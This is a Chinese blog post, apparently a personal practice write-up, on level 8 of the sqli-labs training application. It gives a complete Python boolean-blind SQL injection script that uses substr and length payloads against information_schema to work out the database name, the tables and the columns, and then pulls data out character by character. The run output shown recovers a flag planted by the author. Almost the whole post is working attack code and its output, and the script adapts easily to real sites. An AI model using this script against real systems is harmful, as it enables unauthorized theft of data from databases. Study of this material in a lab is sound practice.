# 原创
：  less-8 in sqli-labs

# less-8 in sqli-labs

模拟ctf的sql注入我自己在数据库中添加了flag字段<br/> 盲注脚本

```
import requests
import string
# 判断数据库的长度
punctuation = string.punctuation
digits = string.digits
ascii_letters = string.ascii_letters
compare_str = ascii_letters + digits + punctuation
url = "http://sqli-labs:8080/Less-8/?id=1%27 "
success_mark = "You are in..........."

# 数据库长度的判断
def getLengthOfDatabase():
    payload = "and length(database())=%s -- +"
    for num in range(1, 20):
        a = url + payload % num
        res = requests.get(a).text
        if success_mark in res:  # 返回的源码中存在You are in...........代表sql语句执行成功
            print("当前数据库名长度为：%s" % num)
            return num

# 数据库名的判断
def getNameOfDatabase(database_length):
    payload = "and substr(database(),%s,1)='%s' --+"
    # databse_length = 8
    database_name = ""
    for num in range(1, database_length + 1):
        for i in compare_str:
            res = requests.get(url + payload % (num, i)).text
            if success_mark in res:
                database_name += i
                print(f"database第{num}个字母为：{i}")
                break
    print(f"数据库名称：{database_name}")
    return database_name

# 获取指定库的表的数量
def getCountOfTables(database_name):
    for num in range(1,20):
        payload = "and (select count(*) from information_schema.tables where table_schema='%s')=%s --+"
        res = requests.get(url + payload % (database_name,num)).text
        if success_mark in res:
            return num

# 获取指定库所有表的表名长度
def getLengthOfTables(database_name,count_of_tables):
    # 储存表名长度的列表，考虑到存在不止一张表的情况
    length_list = []
    for i in range(count_of_tables):
        for num in range(1,20):
            payload = "and length((select table_name from information_schema.tables where table_schema=database() limit %s,1))=%s --+"
            res = requests.get(url + payload % (i,num)).text
            if success_mark in res:
                # 匹配到就加到表名长度的列表
                length_list.append(num)
                print("第{}表的长度为{}".format(i,num))
                break
    # 返回最终的表名长度的列表
    print(f"所有表的长度：{length_list}")
    return length_list

# 获取所有表的名字
def getNameOfTables(database_name,count_of_tables,length_list):
    #定义储存表名的列表
    tables = []
    #表数量有多少就循环多少次
    for i in range(count_of_tables):
        #定义存储表名的变量
        name = ""
        #表名有多长就循环多少次，表长度和标序号(i)一一对应
        for j in range(1,length_list[i]+1):
            #k是字符取值a-z(根据实际情况进行更改)
            for k in compare_str:
                payload = "and substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%s' --+"
                res = requests.get(url + payload % (i,j,k)).text
                if success_mark in res:
                    #匹配到就加到表名变量里
                    name = name + k
                    print(k)
                    break
        #添加表名到表名列表里
        print("第{}个表的名字为{}".format(i,name))
        tables.append(name)
    #返回最终的表名列表
    print("所有表的名字：",end="")
    print(tables)
    return tables

#获取指定表的列数量
def getCountOfColumns(tableofselect):
    for num in range(1,20):
        payload = "and (select count(*) from information_schema.columns where table_name='%s')=%s --+"
        res = requests.get(url + payload % (tableofselect,num)).text
        if success_mark in res:
            #返回最终列的数量
            print("{}表中列的数量为{}".format(tableofselect,num))
            return num

#获取指定表的所有列的列名长度
def getLengthOfColumns(database_name,tableofselect,count_of_column):
    #定义储存列名长度的变量
    #使用列表考虑到列数量不唯一的情况
    length_lists = []
    for i in range(count_of_column):
        for num in range(1,20):
            payload = "and length((select column_name from information_schema.columns where table_schema=database() and table_name='%s' limit %s,1))=%s --+"
            res = requests.get(url + payload % (tableofselect,i,num)).text
            if success_mark in res:
                #匹配到届加到列名长度的列表
                length_lists.append(num)
                print("第{}列的长度为{}".format(i,num))
                break
    #返回最终的列名长度的列表
    print(f"所有列的长度为：{length_lists}")
    return length_lists

#获取指定库指定表的所有列名
def getNameOfColumn(database_name,tableofselect,count_of_columns,length_lists):
    #定义存储列名的列表
    columns = []
    for i in range(count_of_columns):
        #定义存储列名的变量
        name = ""
        for j in range(1,length_lists[i]+1):
            for k in compare_str:
                payload = "and substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %s,1),%s,1)='%s' --+"
                res = requests.get(url + payload % (database_name,tableofselect,i,j,k)).text
                if success_mark in res:
                    #匹配到加入到列名变量内
                    name = name + k
                    break
        #添加列名到列名列表里
        print(f"此时的列名字为{name}")
        columns.append(name)
    print("所有的列名为：",end="")
    print(columns)
    return columns

#指定库指定表指定列爆数据(flag)
def getDataOfFlag(database_name,tableofselect,column):
    #初始化flag的长度为1
    flag_length = 1
    flag = ""
    #从1开始无限循环flag的长度直到找出
    while True:
        #flag中每一个字符的所有可能取值
        for i in compare_str:
            payload = "and substr((select {} from {}.{}),{},1)='{}' --+".format(column,database_name,tableofselect,flag_length,i)
            res = requests.get(url + payload).text
            if success_mark in res:
                #显示flag
                flag += i
                print(flag)
                #flag终止条件，即flag的尾端右花括号
                if i == "}":
                    print()
                    return 1
                break
        #如果没有匹配成功，flag长度加1，继续循环
        flag_length += 1

#主函数
if __name__ == '__main__':
    #爆flag的操作
    print("Judging the number of tables in the database...")
    database_name = getNameOfDatabase(getLengthOfDatabase())
    count_of_tables = getCountOfTables(database_name)
    print("[+]There are {} tables in this database".format(count_of_tables))
    print()
    print("Getting the table name...")
    length_list_of_tables = getLengthOfTables(database_name,count_of_tables)
    tables = getNameOfTables(database_name,count_of_tables,length_list_of_tables)
    for i in tables:
        print("[+]{}".format(i))
    print("The table name in this database are：{}".format(tables))

    #选择需要查询的表
    column_to_find = input("Select the table name:")
    if column_to_find not in tables:
        print("Error!")
        exit()
    print()
    print("Getting the column names in the {} table...".format(column_to_find))
    count_of_columns = getCountOfColumns(column_to_find)
    print("[+]There are {} columns in the {} table".format(count_of_columns,column_to_find))
    length_list_of_columns = getLengthOfColumns(database_name,column_to_find,count_of_columns)
    columns = getNameOfColumn(database_name,column_to_find,count_of_columns,length_list_of_columns)
    print("[+]The column(s) name in {} table is: {}".format(column_to_find,columns))

    #选择需要查询的列
    data_to_find = input("Select the column name:")
    if data_to_find not in columns:
        print("Error!")
        exit()
    print()
    print("Getting the flag...")
    print("[+]The flag is ")
    getDataOfFlag(database_name,column_to_find,data_to_find)

```

盲注结果

```
D:\Pycharm\3.9\Scripts\python.exe D:/Pycharm/3.9/hello.py
Judging the number of tables in the database...
当前数据库名长度为：8
database第1个字母为：s
database第2个字母为：e
database第3个字母为：c
database第4个字母为：u
database第5个字母为：r
database第6个字母为：i
database第7个字母为：t
database第8个字母为：y
数据库名称：security
[+]There are 5 tables in this database

Getting the table name...
第0表的长度为6
第1表的长度为10
第2表的长度为8
第3表的长度为7
第4表的长度为5
所有表的长度：[6, 10, 8, 7, 5]
e
m
a
i
l
s
第0个表的名字为emails
h
e
r
m
e
s
f
l
a
g
第1个表的名字为hermesflag
r
e
f
e
r
e
r
s
第2个表的名字为referers
u
a
g
e
n
t
s
第3个表的名字为uagents
u
s
e
r
s
第4个表的名字为users
所有表的名字：['emails', 'hermesflag', 'referers', 'uagents', 'users']
[+]emails
[+]hermesflag
[+]referers
[+]uagents
[+]users
The table name in this database are：['emails', 'hermesflag', 'referers', 'uagents', 'users']
Select the table name:hermesflag

Getting the column names in the hermesflag table...
hermesflag表中列的数量为2
[+]There are 2 columns in the hermesflag table
第0列的长度为2
第1列的长度为4
所有列的长度为：[2, 4]
此时的列名字为id
此时的列名字为flag
所有的列名为：['id', 'flag']
[+]The column(s) name in hermesflag table is: ['id', 'flag']
Select the column name:flag

Getting the flag...
[+]The flag is 
f
fl
fla
flag
flag{
flag{3
flag{32
flag{327
flag{327a
flag{327a6
flag{327a6c
flag{327a6c4
flag{327a6c43
flag{327a6c430
flag{327a6c4304
flag{327a6c4304a
flag{327a6c4304ad
flag{327a6c4304ad5
flag{327a6c4304ad59
flag{327a6c4304ad593
flag{327a6c4304ad5938
flag{327a6c4304ad5938e
flag{327a6c4304ad5938ea
flag{327a6c4304ad5938eaf
flag{327a6c4304ad5938eaf0
flag{327a6c4304ad5938eaf0e
flag{327a6c4304ad5938eaf0ef
flag{327a6c4304ad5938eaf0efb
flag{327a6c4304ad5938eaf0efb6
flag{327a6c4304ad5938eaf0efb6c
flag{327a6c4304ad5938eaf0efb6cc
flag{327a6c4304ad5938eaf0efb6cc3
flag{327a6c4304ad5938eaf0efb6cc3e
flag{327a6c4304ad5938eaf0efb6cc3e5
flag{327a6c4304ad5938eaf0efb6cc3e53
flag{327a6c4304ad5938eaf0efb6cc3e53d
flag{327a6c4304ad5938eaf0efb6cc3e53dc
flag{327a6c4304ad5938eaf0efb6cc3e53dc}

```
